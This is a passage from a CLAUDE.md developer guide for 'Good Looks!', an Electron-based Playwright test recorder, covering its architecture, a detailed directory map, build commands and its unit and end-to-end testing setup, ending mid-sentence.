# CLAUDE.md

Working rules for **Good Looks!** (a Playwright test recorder). This file, `PORTING.md`, `docs/ARCHITECTURE.md`, and `docs/DECISIONS.md` are the docs that matter; all are versioned and hand-maintained in this repo.

This is a standalone **Electron** app. It builds, runs and packages entirely from this folder with `npm` — no external SDK, no host application, and no requirement that the folder live at a particular path. **`PORTING.md` records what the migration off the Glaze SDK changed and why** — read it before assuming anything about the shell layer, the component library, or the build.

## What this app does

Records interactions on any website (clicks, typing, navigation, assertions) and generates runnable `@playwright/test` specs from them.

- **`docs/ARCHITECTURE.md`** — the per-file map of what exists and why. **Read it before any non-trivial change**; it is the fastest way to find the module that already does what you were about to write.
- **`docs/DECISIONS.md`** — the dated record of *why* each feature landed the way it did. When something looks over-built, this usually names the failure it was built against.

## Architecture

- **Frontend** (React 19 + Vite, `renderer/`) renders in Electron renderer processes, served over a custom `app://` scheme. **Not `file://`** — Vite emits module scripts, which get a null origin under `file://` and are blocked by CORS. The symptom is a blank window and a clean log. See `main/shell/app-protocol.ts`.
- **Backend** (Node.js, `main/`) is the Electron main process.
- They talk over Electron IPC (handlers in `main/handlers/`, called from the renderer via `window.glazeAPI.*` exposed in `renderer/preload.ts`). The global keeps its historical name because every view, page-world helper and test stub addresses it.
- **`main/shell/` is the only place that may import `electron`.** Everything else in `main/` goes through `@shell/backend`, which is where the logger, the `windowKey`-stripping BrowserWindow wrapper and the navigation-event types live. An ESLint rule enforces the boundary.
- **The metrics DB** (`userData/recorder/metrics.db`, `node:sqlite`) is a **derived shadow** of the JSON stores and run artifacts — never a store of record. Three consequences, all load-bearing: it is rolled up **before** retention prunes (that is the whole point — after it, retention costs you pictures, not history); a failure to open, migrate or write it must **never** reach a run, so every method swallows its own errors and degrades to "no metrics"; and a schema change needs no migration, because dropping and replaying from disk gives the same answer. `node:sqlite` is imported **dynamically** — a static import would throw at module load on a runtime without it and take the backend down.
- **`shared/`** holds logic the app AND the standalone MCP server both need. They can't share a `.ts` module — the app is compiled and bundled, the MCP is plain `.mjs` with no build step — so these are `.mjs` with a hand-written `.d.mts` beside them, which keeps `type-check` a real gate over every TypeScript caller. **Pure only** (no `fs`, no shell import, no IPC, no `process`); anything needing the filesystem stays on its own side and hands data in. Reach for this before transcribing a constant into `mcp/` — a copy is right the day it's written and silent forever after.

## Directory map

```
main/shell/         the Electron seam: backend adapter, logger, host IPC handlers,
                    the app:// protocol. THE ONLY PLACE THAT IMPORTS `electron`.
main/handlers/      IPC handler registration
main/services/      business logic (recorder, playwright-runner, llm, spec-parser, visual-pipeline,
                    metrics-store — the derived metrics DB, rolled up before retention prunes).
                    ai-debug-store and ai-debug-history-store are a deliberate SPLIT: the first
                    holds the model's answer (quotes the script and run output, so twenty newest
                    and hard-deleted with its test), the second holds facts about each attempt
                    and no content at all — which is what lets it outlive both the cap and the
                    test, and tombstone rather than erase when a test is deleted
main/services/agent/ the TRAINER AGENT (PR 3 of the bar plan): drives a live
                    recording session toward a typed goal, one verified step at
                    a time — the model proposes, recorderService.tryStep (the
                    same gate verifyAndInsertSteps loops over) disposes. State
                    machine + user-turn mailbox in trainer-agent-service.ts
                    (deps-injected, insights-style), prompt builders deriving
                    their vocabulary from main/recorder/types.ts constants in
                    agent-prompts.ts, and the bounded page inventory (never
                    HTML, never a field's value) in page-summary.ts. The agent
                    is ATTENDED — every run starts from an explicit send.
                    suggestion-service.ts (PR 4) is the UNATTENDED one: the AI
                    suggestion strip, debounced off recorder-service's
                    onCaptureRecorded hook, gated by aiSuggestionsEnabled (OFF
                    by default; the flag is re-read at send time AND after the
                    model answers), offers-only (labels cross to the renderer,
                    never raw steps; fill/press refused by a service-side
                    allowlist; accepting goes through tryStep). check:agent-
                    egress pins the whole directory the way insights-egress
                    pins the report. e2e/agent-loop.spec.ts is the assembled
                    authority
main/services/insights/  the scheduled AI report (Settings → Alerts, off by default) — one
                    of the app's TWO unattended LLM egress paths (the other is the trainer's
                    suggestion strip, main/services/agent/suggestion-service.ts), which is
                    why its facts builder reads
                    only indexes and aggregates (never a log, script or header value) and
                    `check:insights-egress` pins that with a planted secret. Release notes
                    ship as typed data in release-notes.ts: bump `package.json` version ⇒
                    add an entry there, same commit. Reports persist in
                    insight-report-store.ts (primary data — never metrics.db, which drops
                    and replays)
main/services/ts-service/  the Script IDE's TypeScript language service in an Electron
                    utilityProcess: core.ts (the service + the app's six inspections,
                    pure wrt the app), child.ts (the forked entry), client.ts (the
                    main-side client; "unavailable" is a state, never an error).
                    `typescript` is a RUNTIME dependency for it, resolved from the
                    runner's node_modules so the Playwright types match the CLI
main/services/llm/  local + hosted LLM chat integration (Ollama, LM Studio, Claude)
                    overlay-rule-store + dismiss-fixture-source are the two halves of
                    STANDING OVERLAY RULES — "on this host, click this away whenever it
                    appears". Never a step: a consent modal is re-injected on every
                    document, so a dismissal placed at one point in a step list is right
                    until the next navigation. Both halves resolve a rule through the SAME
                    `matchesFor`, interpolated from shared/overlay-rules.mjs
main/recorder/       recording-session logic (script injection, step capture)
main/windows/        BrowserWindow creation/config
renderer/main/       primary views (home, recording/trainer, script view, ai-debug-panel, stats)
renderer/settings/   the Settings SCREENS (panes/, one per rail row). Two routes in the MAIN
                     window — `/settings`, the board, and `/settings/$pane` — plus
                     `/settings/$pane/$topic` for the Documentation pane. It was a separate
                     `BrowserWindow` until 2026-08-24; see docs/plans/settings-view.md.
                     Two consequences worth knowing. The rail is the APP's
                     (`library-sidebar.tsx` renders `SettingsRailRows` where the library
                     would be, the way it renders `RoutinesRail` on /batch), so the
                     controller and the search live in `settings-scope.tsx` ABOVE the
                     SplitView — the rail and the content are siblings and both read them.
                     And `isSettingsPath` in renderer/lib/settings-route.ts is the ONE
                     spelling of "are we in settings": the rail swapping on a path the
                     scope did not mount for throws out of `useSettingsController`
renderer/trainer/    the trainer window's own panel (runs the recorder store with no router)
renderer/recorder-chrome/  the training browser's URL bar. Renders into a WebContentsView
                     docked above the untrusted page INSIDE the recorder window — not a
                     window, hence not `*-window.html`. Read-only by design: a navigation
                     the user types is one the recorder does not record
renderer/ui/         the app's component library (Radix + Tailwind + cva). Replaces the
                     former SDK design system; same symbol names and prop contracts, so
                     consuming views were not rewritten. Select/DropdownMenu are still
                     backed by real macOS menus via Menu.popup.
renderer/components/ reusable UI composed from renderer/ui
renderer/lib/        shared frontend utilities (llm-prompts, host bridge types, etc.)
renderer/theme/      the indie redesign's bespoke layer: --gl-* tokens, self-hosted fonts,
                     the atmosphere overlays + reduced-motion floor, primitives/ (the
                     seventeen components a screen is built from), shell/ (the top
                     strip + rail the app's FRAME is drawn from) and screens.css
                     (what one screen IS, filled in per screen by Phase B). Distinct from
                     renderer/ui: that is the component library the views import, this is
                     the redesign's own token/treatment layer on top of it, declared by us
                     so `check:theme-tokens` can catch a name that resolves to nothing
renderer/dev/        the browser preview's fake backend (`npm run dev:web`) — never shipped
shared/              the ONE pure core both the app and the MCP import (.mjs + hand-written
                     .d.mts). Pure only: no fs, no @shell/backend, no IPC, no process.
                     THE RUN FIXTURES LIVE HERE (R8, 2026-08-25) — capture, heal,
                     settle, signature, user-page, log-capture, the spec runtime, the
                     step reporter, page-actions and step-marker. They are strings, so
                     they were always pure; what forced the move is that a CI runner has
                     no app, and a CLI that runs fixture-free reports failures the app
                     would have healed. `dismiss-fixture-source.mjs` is HERE now
                     (2026-08-25), after locator-engine.mjs made it possible — and
                     it had to be: the capture fixture imports `./glaze-dismiss.mjs`
                     UNCONDITIONALLY, so it is a DEPENDENCY, not a capability.
                     While only the app could write it, every unattended run with
                     any capability on wrote a capture fixture whose imports could
                     not resolve — working on a machine where the app had run and
                     failing on every fresh CI container, which is the R8 failure
                     verbatim. `check:ci-fixtures` DERIVES the written set from
                     the fixture's own imports now; the hand-written list is what
                     missed it. dismiss-fixture-names.mjs keeps the pure names and
                     gained `dismissEnv`, because three processes write it.
                     locator-engine.mjs is THE DOM WALK every locator question is
                     answered by — DOM_HELPERS (what an element IS), CONTEXT_HELPERS
                     (ctxFilter), UNIQUENESS_HELPERS (matchesFor) and the scan caps —
                     held as source text because none of it runs in the process that
                     owns it. It was under main/recorder/ until 2026-08-25, which made
                     it reachable only from the compiled app, and TWO features were
                     blocked on exactly that: standing overlay rules did not run on an
                     unattended run, and run-time Auto-Heal was switched ON for one and
                     healed nothing (R49) because the heal MAP holds a probe built from
                     these strings and nothing could build one. PICKED_HELPERS and
                     CSS_PROPS_HELPER did NOT come: they describe a picked element for
                     the refine dialog and interpolate CSS_ASSERT_PROPS from
                     main/recorder/types.ts, a model no unattended run has a use for.
                     user-data-rules.mjs is the shape that rule forces: WHERE the data
                     lives needs the disk, so the probing stays on each side and only the
                     RULES are shared — the override name, the store markers, the legacy
                     pattern, the order. Both processes write, so a drift is the app
                     reading a library the MCP is not writing to.
                     script-path.mjs is WHERE A TEST'S SPEC IS, on the machine
                     asking. scriptPath is stored ABSOLUTE from the recording
                     machine, so a copied library resolved every spec to a
                     ../../.. path back up to the author's home and Playwright
                     found no tests — R10, and R14's blocker. The rule is the one
                     writeScript already applied before WRITING (only a path
                     inside this scripts dir is honoured), applied on READ where
                     all three processes need it. A bundle's tests.json is
                     UNTRUSTED INPUT for the same reason an imported project is:
                     the derived path is joined onto the local scripts dir and
                     then executed as a spec.
                     export-bundle.mjs is WHAT MAY LEAVE (R10), and the
                     shape it takes from the rule above: a bundle's
                     scriptPath is the position INSIDE the bundle, which
                     resolves through script-path.mjs on whatever runner it
                     lands on. Two allowlists, because a denylist is right
                     the day it is written and wrong the day a store file
                     lands beside the others — FILES (tests.json + scripts/,
                     never browsers, history, logs, artifacts, metrics.db or
                     any .bin) and FIELDS, where a record is REBUILT from
                     named keys. The field rule is "a run reads it": a field
                     nothing reads is inert in a bundle, which is R49's shape.
                     check:export-egress reads TestRecord and refuses a field
                     in NEITHER list, so a new one fails the gate until
                     somebody decides. Here rather than in cli/ because the
                     plan has the app exporting too, and two allowlists is the
                     drift this repo keeps paying for.
                     step-line-map.mjs is WHICH STEP A SPEC LINE IS — the
                     fallback that turns the reporter's line number into a step
                     index. Here because the unattended runner needs it: until
                     2026-08-26 that path WROTE step-reporter.mjs on every run
                     and passed no --reporter, so no marker was emitted and no
                     run could say which step failed. Written-but-unwired is
                     R49's shape without the switch; check:ci-fixtures now
                     asserts a fixture this path writes is one it loads.
                     heal-key.mjs is the same shape again: how a chained locator's
                     heal-map key is SPELLED, built from a Locator model on one side
                     and from factory ARGUMENTS on the other.
                     heal-probe.mjs and heal-map.mjs are the rest of that
                     feature: the probe a failing locator is diagnosed with, and
                     the MAP keyed by heal-key that carries one per step. The
                     fixture rethrows untouched for a key it cannot find, so the
                     map IS run-time Auto-Heal — a runner that cannot build one
                     cannot heal, whatever GLAZE_HEAL says. Both moved here once
                     locator-engine.mjs did (R51). `stepLabel` is INJECTED, not
                     computed: describeStep is still in script-generator.ts
                     beside its renderer mirror, so the app passes it and an
                     unattended run does not — the fixture falls back to the
                     step id, which puts the gap in the artifact rather than in
                     the ranking.
                     run-attempts.mjs is WHAT A RETRY MEANS (R24), and the
                     rule is that a retried pass answers TWO questions
                     differently: PASSED as an outcome (the pass rate says
                     yes) and FAILED as a signal (the flake transition series
                     says it went red). Collapsing them either way is the bug
                     ROUTINES.md refused a retry policy over — "a retry
                     stacked on Auto-Heal makes a flaky test look stable,
                     which is precisely the signal the Stability panel exists
                     to give". The verdict check sits ABOVE `failed === 0` in
                     verdictFor, because that rule reads OUTCOMES: a test
                     needing a retry on every run has no failures and reached
                     "stable" with every new field present and correct.
                     retryFields returns FIELDS to spread and is EMPTY when
                     nothing retried — `attempt: 0` on every row is
                     indistinguishable from a row predating the field
                     attempt-artifacts.mjs is WHERE ONE ATTEMPT'S EVIDENCE
                     GOES (R24a). Playwright re-runs a failed test from the
                     top and the capture fixture is a `page` fixture, so every
                     attempt re-entered it with the step counter at 0 and one
                     fixed directory — attempt 2 wrote over attempt 1's
                     screenshots, manifest and logs, and the scratch dir
                     holding both traces was deleted at run end. A retry only
                     follows a failure, so the attempt destroyed was always
                     the one worth reading. Attempt 0 KEEPS the run directory
                     (it is the failing one, and where every reader already
                     points); later attempts get `attempt-<n>/`. Interpolated
                     into the capture fixture as ATTEMPT_HELPERS, because that
                     file WRITES the directories the app READS
                     heal-artifacts.mjs is the FILE that map arrives in —
                     healMapFileName/healDirName. Added after R49, where the
                     app wrote <runId>.heal-map.json and the MCP path pointed
                     GLAZE_HEAL_MAP at <testId>.heal.json, a name nothing has
                     ever written: healing installed itself and healed nothing,
                     silently, on every unattended run. check:ci-fixtures now
                     asserts a GLAZE_HEAL that is not "0" implies both a map
                     named through here and a writer for it.
                     testid-attr.mjs is that shape for a testid locator's
                     ATTRIBUTE: getByTestId resolves only data-testid, so a
                     locator recorded off data-test-id/data-test carries
                     `attr` and emits an attribute selector — spelled once
                     here for the generator, the heal key, the heal fixture
                     and the renderer's locator renderings, with the parser's
                     inverse beside it. The trainer's oracle counts only the
                     recorded attribute; counting all three is how a step
                     could be unique live and match nothing on every run.
                     frame-ref.mjs is that shape for an iframe in a locator's
                     frame path: frameSelector spells `frameLocator(<sel>)` and
                     parseFrameSelector reads it back — one spelling for the
                     generator, the parser and the step list, so a hand edit of a
                     framed step is not dropped. Engine only; the trainer does not
                     yet capture inside a frame (docs/IFRAMES.md).
                     basic-auth.mjs is that shape for HTTP basic auth's ORIGIN
                     SCOPE: an unscoped credential leaks (Playwright answers any
                     401, Electron's login event fires for every request), so the
                     generated test.use({ httpCredentials, origin }) and the
                     trainer's login handler derive the scope from one
                     `answersLoginFor`. check:basic-auth pins both.
                     start-url.mjs is that shape for the address a TYPED SITE
                     resolves to: the recorder has always prepended `https://`,
                     and once a dialog SHOWS that too, the note and the
                     navigation must agree. Start URLs only — a goto step's
                     URL may be baseUrl-relative, which is why the module is
                     named for the question rather than for `normalize`.
                     run-provenance.mjs is WHAT A RUN WAS TESTING — commit,
                     branch, repository, job — read from the environment by the
                     runner both unattended entry points share. Not backfillable
                     (the container is gone), which is why it landed AHEAD of the
                     surfaces that read it and why R12's ingest was blocked on
                     it. Every field is untrusted text and each is refused
                     INDEPENDENTLY: a fork's PR names its own branch, and a
                     hostile one must not cost the run its revision. Over-long
                     is REJECTED, never truncated — a cut sha is a plausible
                     sha for a different commit, while absent is honestly
                     unknown. Its sibling run-trigger.mjs gained `cli` at the
                     same time, and for a reason worth reading: run-tests.mjs
                     hard-coded `trigger: "mcp"`, correct while the MCP server
                     was its only caller and silently wrong from the day the CLI
                     imported it — so every `good-looks run`, this repo's own
                     action included, was recorded as MCP-driven. The literal
                     never changed; the set of callers did, which is why
                     check:cli-exit now does one REAL run and reads the record
                     back rather than reading source
                     run-ingest.mjs is the GATE A FOREIGN RUN RECORD CROSSES
                     (R12) — `good-looks ingest` carries a CI job's runs back,
                     because a container's library dies with it. Built the
                     obvious way it is a READ PRIMITIVE: `logFile` is an
                     absolute path from the other machine, and the app's
                     readLog reads it unbounded while searchLogs reads every
                     live record's and returns excerpts — so a stored foreign
                     path is any file on disk, through a search box. The gate
                     returns NO logFile; cli/ingest.mjs derives it from a
                     validated id, the same rule script-path.mjs applies. A
                     required field missing refuses the record, an optional one
                     refuses only itself. check:run-ingest also pins that the
                     gate and RunRecord still agree in BOTH directions
                     a11y-rollup.mjs is that shape a third time, and it retired two
                     hand-copies rather than adding a third: violationKey/keysOf lived
                     in main/services/a11y-diff.ts AND renderer/lib/a11y-format.ts,
                     each asking the next person to keep them in sync. Two spellings
                     of a key mean an accepted violation stops matching its baseline,
                     so the app reports a finding the user already dismissed.
                     selectLatestA11yRuns is here for the process boundary: the Stats
                     tile counts from a query cache, the a11y:rollup handler from
                     replay files on disk, and only a shared rule keeps them
                     describing the same runs.
                     overlay-rules.mjs is that shape again, across a nastier boundary:
                    a rule is resolved by the TRAINER inside a live Electron page and by
                    the RUN inside a Playwright worker's init script. One watcher source,
                    interpolated into both, calling a `matchesFor` each host supplies —
                    so a rule taught in the trainer and a rule enforced in a run cannot
                    drift into agreeing "for now". `check:overlay-rules` fails if a second
                    copy of either appears.
                    browser-install.mjs is the same shape for the runner's "is
                    the browser there" question: which `<engine>-<revision>`
                    directories the BUNDLED CLI launches, read from its
                    browsers.json. Both the app and the MCP decide whether to
                    install before a run; a name-prefix rule in each said yes
                    to the previous Playwright's build after the 1.62 upgrade.
                    step-semantics.mjs is the load-bearing one: the single
                     definition of what each assert/wait/condition MEANS (match
                     mode, case rule, whitespace rule), read by the generator,
                     by the injected replayer (as JSON + `toString`d source) and
                     by the renderer's step list. Three copies of those rules is
                     what made a "URL contains" assertion that could never pass
workers/mailbox/     the catch-all inbox behind the `emailCode` step, deployed
                     separately (Cloudflare Email Routing -> Worker -> KV, one
                     authenticated JSON endpoint). Shopify's customer accounts have
                     NO PASSWORD — a six-digit code by email is the only way in, and
                     classic accounts, Multipass and the Customer Account API all
                     dead-end (DECISIONS 2026-08-26) — so the suite needs a mailbox
                     it owns. In the repo rather than only in a dashboard for the
                     switch-branch reason: a mechanism reachable only through a
                     button is one nobody can debug. It imports shared/email-code.mjs
                     rather than parsing mail itself, and is BOOTED by
                     main/services/mailbox-worker.test.ts because `workers/` matches
                     neither vitest project
bin/good-looks.mjs   the `good-looks` CLI's entry point (R3). Thin by design: argv in,
                     exit code out. `process.exitCode` and a natural return, NEVER
                     `process.exit` — that truncates a piped stdout, so a CLI doing it
                     prints nothing at all under CI and works perfectly in a terminal
cli/                 what the CLI decides, kept out of bin/ so it can be tested.
                     args.mjs (an unknown flag is a REFUSAL, and there is NO default
                     selector — a misspelt flag must not run the whole library on a CI
                     runner), exit.mjs (the 0/1/2/3 contract; code 2 exists because a
                     suite of zero is shaped exactly like a clean pass), run.mjs (the
                     THIRD CALLER of mcp/run-tests.mjs — never a third runner — plus
                     `install`, which exists mostly so the missing-browser refusal can
                     name a command rather than telling a CI runner to open the app).
                     junit.mjs is R1's caller and the FIRST emit path outside main/:
                     the app's report-emitter cannot be reached from plain .mjs, so
                     the pure emitters are called directly and everything around them
                     done again here. Its scope is a SECURITY boundary — the report is
                     built from ONE INVOCATION'S results, never run history, because
                     an app run's secrets live in a store this process cannot open and
                     could not be redacted out. `check:emit-redaction` covers cli/ and
                     mcp/ as of R1, per plan §3.5.
                     ingest.mjs is R12's disk half — locate the artifact
                     (either level), plan, copy each log BY ID, stamp
                     ingestedAt, write through saveRunRecords so the cap and
                     pruned tally stay one implementation.
                     export.mjs is R10's, and points the other way: a bundle a
                     runner can be handed. The store it reads holds run
                     history, logs, screenshots, metrics.db, saved sessions,
                     an LLM key, a webhook URL and the encrypted secrets, so
                     the hand-copy it replaces was a leak waiting for someone
                     in a hurry. WHAT may cross is shared/export-bundle.mjs,
                     an ALLOWLIST in both directions — two files, and a
                     REBUILT record rather than a spread one, so the next
                     field on TestRecord cannot ship because nobody looked.
                     Its unit tests live in main/services/cli-exit.test.ts,
                     cli-junit.test.ts, cli-ingest.test.ts and
                     cli-export.test.ts, because vitest's
                     node project takes main/**, mcp/** and renderer/lib/** and
                     a test file here would match NEITHER project
mcp/                 standalone MCP server exposing the test library to external MCP clients.
                     `data-dir.mjs` finds the app's store; it reaches the SAME answer the
                     app does because BOTH PROCESSES WRITE, and the rules they share live
                     in shared/user-data-rules.mjs. It replaced `glaze-data.mjs`, which
                     resolved from a `package.json` `id` the SDK port removed — so the
                     server threw at load and EVERY tool was unreachable from
                     2026-08-08 to 2026-08-14. `check:mcp-boot` exists because nothing
                     else booted the server: the other check:mcp-* read the source and
                     import the pure modules, and stayed green throughout
                     (list_tests, get_test, list_runs, get_run_log, run_test, run_batch, run_group,
                      list_routines, run_routine,
                      get_visual_report, get_a11y_report, get_run_logs, list_heals,
                      list_batches, compare_runs, triage_run, get_step_health,
                      get_suite_cost, get_browser_matrix, get_flake_report,
                      get_step_matches, capture_app, get_screenshot)
                     — see mcp/README.md
docs/                ARCHITECTURE.md (per-file map) + DECISIONS.md (dated rationale) +
                     MCP-GUIDE.md and CI-GUIDE.md, which are ALSO THE APP'S IN-APP MANUAL
                     — Settings → Documentation renders BOTH (renderer/lib/doc-blocks.ts
                     parses a subset of markdown and THROWS on the rest; check:docs-blocks
                     runs it in the gate over every doc in APP_DOCS). Edit them as prose,
                     not as UI copy, but expect the gate to refuse an ordered list or a
                     nested bullet. TOPIC SLUGS ARE UNIQUE ACROSS THE TWO, not within
                     one: a slug is the row id the settings search indexes a topic under,
                     the key the topic list renders it with, and the segment
                     /settings/documentation/$topic carries — none of the three is scoped
                     by document, so two files both ending in "See also" collide in all
                     three and the symptom is a Help item opening the wrong document.
                     check:docs-blocks asserts it, and asserts REQUIRED_TOPIC_SLUGS over
                     the UNION rather than per file — asking each doc for every linked
                     slug fails the moment there are two
.github/             PR template, hygiene workflow, and the script it runs.
                     action-selftest.yml drives action.yml the way a stranger
                     would (`uses: ./`) against a library built from nothing —
                     the one configuration no local check can stand up
action.yml           the `good-looks` GitHub Action (R14). A COMPOSITE action,
                     because that is the only way the CLI reaches a runner:
                     package.json is private with no `files` field, and GitHub
                     checks this repo out at ${{ github.action_path }}, which is
                     exactly the PROJECT_ROOT mcp/run-tests.mjs resolves
                     node_modules from. Every input reaches bash as an ENV VAR,
                     never spliced through ${{ }} — an action input is
                     attacker-controlled the moment a workflow passes it a PR
                     title, and `${{ }}` is substituted before bash parses the
                     line. check:github-action pins that, the read-not-written
                     Playwright pin, and that every flag it emits is one
                     cli/args.mjs accepts (an unknown flag is a REFUSAL, so a
                     rename would turn every run through the action into exit 3)
vite.config.ts       renderer build (two windows + the training browser's URL strip).
                     `--mode preview` builds the browser
                     preview instead — preview.html + renderer/dev/, into build-preview/
scripts/build-main.mjs   esbuild bundling for the main process + preload
scripts/verify-package.mjs  the two guards around `npm run package`: refuse a symlinked
                     node_modules before the build, and re-ask the finished .app whether
                     every runtime dependency is resolvable inside it. electron-builder
                     reports the failure and exits 0, so the exit code cannot be trusted
scripts/dev-app-bundle.mjs  what makes `npm run dev` look like this app: a branded,
                     re-signed clone of Electron.app (name + icon), because macOS reads
                     both from the BUNDLE and dev runs Electron's. Never `app.setName` —
                     that moves userData. Falls back to plain Electron on any failure
scripts/switch-branch.mjs  the branch switcher's build half: checks a branch out into
                     its own worktree under userData, builds it, prints where. Runs
                     standalone (`node scripts/switch-branch.mjs --repo . --branch main
                     --out /tmp/b`) — a build only reachable from a button is one
                     nobody can debug
eslint.config.js     lint config, incl. the `electron`-import boundary rule
vitest.config.ts     test runner config (node + jsdom projects)
preview.html         browser-preview entry. NOT `*-window.html` on purpose — see the file
*.test.ts(x)         Vitest tests, colocated with the code they cover
main/services/__tests__/  standalone check:* scripts + the @shell/backend stub
renderer/__tests__/setup.ts  jsdom setup (browser-API stubs; NOT the toast stub)
renderer/__tests__/sonner-stub.tsx  the toast stub, aliased over `sonner` in
                    vitest.config.ts. Assert with `toastTexts()`, not the DOM —
                    a toast is recorded here as a CALL and never rendered
```

## Commands

- `npm install --include=dev` — install deps (plain `npm install` under `NODE_ENV=production` prunes devDeps)
- `npm run lint` / `npm run type-check` / `npm run test:all` — must pass before considering a change done
- `npm run build` — Vite (renderer) then esbuild (main + preload)
- `npm run package` — build, then electron-builder → `dist/mac-arm64/Good Looks!.app`. Guarded on both sides by `scripts/verify-package.mjs`: it refuses to start when `node_modules` is a symlink, and re-checks the finished bundle for the whole runtime dependency closure. **Needs a real install in a worktree** — see the gotcha below
- `npm run dev` — Vite dev server + Electron, renderer hot-reloads
- `npm run dev:web` — **the browser preview**: the whole renderer in an ordinary tab at `http://localhost:5199`, against fixtures, with no native shell. The fastest way to see a UI change, and the only one an agent can drive. Open one view directly with `?view=stats|visual|batch|heals|settings` or `?test=<id>` — the router uses memory history, so a URL PATH cannot select a view. **`?view=specimen`** mounts `renderer/dev/specimen.tsx` INSTEAD of the app: every redesign primitive in every state, which is the only place they can be seen rendered (jsdom has no layout engine and the dom project runs with `css: false`). **`?view=settings`** opens the Settings board and **`?view=settings&pane=cost`** one section — ordinary navigations since Settings became a route rather than a window, where this used to mount a second application root because `window:openSettings` did nothing in a tab. **`?view=recorder`** reports a live recording session, because `RootShell` swaps the outlet for `RecordingView` only while `state.recording` and nothing in a tab can make that true; **`?view=recorder-editing`** is the same screen for a session CONTINUING an existing test, which is where the insert cursor sits mid-list and is the only way to see the labelled cursor. **Runs finish here as of B5a**: the bridge pushes `runner:output`/`step`/`done` on a timer, and the outcome comes from the fixture's own history — so `?test=t-login` reliably shows the FAILED console path and `?test=t-checkout` a pass. `npm run build:preview` emits a static bundle to `build-preview/`. It does not replace running the real app: a preview has no backend, so it cannot catch a broken IPC handler, a window that fails to open, or native menu behaviour.
- `npm test` (Vitest, one pass) / `npm run test:watch` / `npm run test:coverage`
- `npm run test:checks` — the standalone `check:*` scripts; `npm run test:all` runs those **and** Vitest
- `npm run check:repo-hygiene` — repo-level checks (no generated files committed, no absolute paths, no secrets, lockfile in sync). Its own cheap workflow, separate from `gate.yml`, which runs the rest (see CI below — it stopped being true that hygiene was all CI could run when the SDK left).

## Testing

**Two systems, one command.** `npm run test:all` = the standalone `check:*` scripts, then Vitest. Both must pass. 6313 Vitest tests across 349 files and 95 checks in the chain as of 2026-09-01 (97 defined — `check:repo-hygiene` and `check:shell-drift` are deliberately outside it).

**A third system the local gate does not run: `e2e/`** — Playwright driving the real app through `_electron` (`npm run test:e2e`, and CI's `gate.yml`). It is where anything about REAL WINDOWS — or a real navigation — gets checked: `click-navigation.spec.ts` (a click that changes route is recorded, including one a client-side router intercepts; the failure it was written against loses six clicks out of six and jsdom cannot host it, because nothing there has a navigation that destroys the document mid-read), `windows.spec.ts` (a second window actually opens), `chrome-clickable.spec.ts` (occlusion and computed cursor), `trainer-dock.spec.ts` (where the trainer panel physically lands next to the training browser), `dialog-footer.spec.ts` (whether a dialog's buttons are laid out inside it), `dialog-lifecycle.spec.ts` (whether the dialog that started a recording is still on top of the app afterwards — the existing recording spec invokes `recorder:start` over IPC, so it opens no dialog and could never see one left behind), `window-title.spec.ts` (that the main window has no title and no page can give it one), `ui-scale.spec.ts` (that real `webContents` end up at the chosen zoom, that window floors are scaled with it, and — the one that would be a product bug — that the TRAINING BROWSER is never scaled with the app), `verified-steps.spec.ts` (that an AI-proposed step is actually TRIED on the live page before it is inserted, that the first failure stops the rest, and that capture does not record the try a second time — a live session acting on a real page, which nothing in jsdom can host), `ts-service.spec.ts` (that the app forks the TypeScript service through a real `utilityProcess` and it answers — the child path, the node_modules resolution and `process.parentPort` exist nowhere else; `check:ts-service` boots the same built file under plain Node), `recorder-shortcuts.spec.ts` (that ⌘R pauses/resumes a live session INSTEAD of the View menu's Reload winning the chord and reloading the window — only a real menu, a real webContents and a real key event can say who wins, and the key must go through `sendInputEvent`, because CDP-synthesized input never reaches `before-input-event`), `agent-loop.spec.ts` (that the trainer agent's proposed steps are TRIED on the live page through the same verify gate as everything else — a scripted Ollama-protocol server, pointed at via `llm:setConfig`'s `baseUrls` override, proposes one click that resolves and one that cannot: one insertion, the failure fed back as prompt evidence, the goal's group bracketing what landed, no double-capture, and an assertion card inserting only on accept — the loop's state machine is unit-tested with stubbed deps, but only the real llm-service, page executor and step list can prove the assembled thing). jsdom has no second window and no layout engine, so these are not slow duplicates of unit tests — they are the only place their subject exists. Reach for it when a change moves, sizes or stacks a window.

**Six specs there are not about windows at all.** `assert-parity.spec.ts`,
`context-parity.spec.ts`, `shadow-parity.spec.ts`, `step-progress.spec.ts`,
`frame-parity.spec.ts` and `retry-evidence.spec.ts`
— the second answers the neighbouring question, not
"what does this step MEAN" but "which element does it POINT AT". Element context
is resolved twice, by a DOM walk in the trainer (`ctxFilter` inside `matchesFor`)
and by real Playwright resolving the chain the generator emits; if those
disagree, the picker says "matches 1 of 9", the user believes the step is pinned,
and the run acts on something else. A model of Playwright's chaining rules cannot
settle it, because the question is whether our model of them is right. **Changing
what a context clause emits or resolves to? Add a row.**

**`shadow-parity.spec.ts`** is the same question one level down — which element
a locator points at when the element is INSIDE A WEB COMPONENT — and it is the
only place that question has an answer, because jsdom can model the DOM walk
but cannot say what real Playwright resolves. Its first run found three
disagreements nobody had measured (`within` a host, `<script>` text counted as
text, a host's text read as empty), one of which was not a shadow bug at all.
**Changing `scanAll`, `pwText`, `composedContains` or the text arm of
`matchesForBase`? Add a row.** The laptop-speed half is
`main/recorder/shadow-dom-capture.dom.test.ts`.

**`assert-parity.spec.ts`.** It is the authority on what a step MEANS, running every row through the real injected replayer AND the real generated source executed by real Playwright, and asserting the two verdicts agree — the property whose absence let "URL contains" generate an assertion that could not pass while the trainer showed it green. It uses a plain browser page rather than `_electron` because its subject is matcher semantics, not a window; it lives here because nothing short of real Playwright can answer the question. **Changing what any assertion, wait or condition emits? Add a row.** The fast counterpart is `main/services/assert-emission.test.ts`, which models the same rules in Node — but a model is only worth what validates it.

**`step-progress.spec.ts`** is the third, and the same argument a third time:
which steps a run REPORTS is what decides which step the app can highlight, and
both writers are unreachable from a unit test — the reporter only exists as a
string the Playwright CLI loads, and the capture fixture's action wrapper only
exists inside a Playwright worker. Nothing here had ever asked real Playwright
which category it files an assertion under. It files them under `expect`, the
reporter only read `pw:api`, and so a failing assertion — the commonest failure
a recorded test has — was reported by nothing at all; on a capture, heal or
crawl run, where the fixtures take every action's location off the spec, NO step
was reported and the progress bar never left the first one. The laptop-speed
half is `check:step-progress`. **Changing what reports a step — the reporter's
categories, the fixture's wrapper, the marker format? Add a row.**

**`retry-evidence.spec.ts`** is the sixth, and it asks two things only real
Playwright answers. Does a retry actually re-enter the `page` fixture with
`testInfo.retry` set — which everything in R24a assumes? And what does
Playwright NAME a retried attempt's scratch directory, which is what the runner
